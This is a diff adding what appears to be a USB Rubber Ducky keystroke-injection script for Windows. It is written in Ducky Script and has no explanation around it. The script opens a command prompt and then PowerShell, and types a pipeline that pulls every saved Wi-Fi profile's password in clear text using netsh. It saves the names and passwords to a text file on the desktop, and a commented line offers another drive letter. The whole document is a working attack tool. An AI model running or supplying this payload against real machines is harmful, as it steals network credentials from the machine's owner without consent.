@@ -1,0 +1,20 @@
+DEFAULTDELAY 10
+DELAY 5000
+GUI r
+DELAY 50
+STRING cmd
+DELAY 50
+ENTER
+DELAY 250
+STRING powershell
+
+REM copy WIFI SSID and password
+STRING  "(netsh wlan show profiles) | Select-String '\:(.+)$' |
+STRING  %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}
+STRING  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
+REM file location
+STRING  | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} >
+STRING C:\Users\J\Desktop\wifi.txt
+REM Z:\data\wifi.txt
+ENTER
+
